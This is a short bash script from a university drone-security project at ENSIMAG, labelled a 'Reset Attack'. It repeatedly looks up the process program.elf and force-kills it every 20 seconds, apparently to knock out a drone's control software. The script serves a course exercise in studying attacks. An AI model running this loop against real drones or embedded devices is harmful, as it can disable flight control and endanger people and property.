#!/bin/bash

################################################
##      ENSIMAG - Ecole National Superieur    ## 
## d'Informatique et Mathematiques Appliques  ##
##                                            ##
##        Codage et Securite de Reseaux       ##
##                                            ##
##            Securite des Drones             ##
##                                            ##
##                  CLAURE CABRERA Oscar Mike ##
##                  DOYEN-LE BOULAIRE Marine  ##
################################################

echo -e "\n\t***********************"
echo -e "\t*   Drone Security    * "
echo -e "\t*    Reset Attack     * "
echo -e "\t***********************"

delay=20
process_RESET="program.elf"

while true; do


	pid_target=`pidof $process_RESET`;

	echo "Good bye $pid_target"	

	sleep $delay

	kill -9 $pid_target
	
done
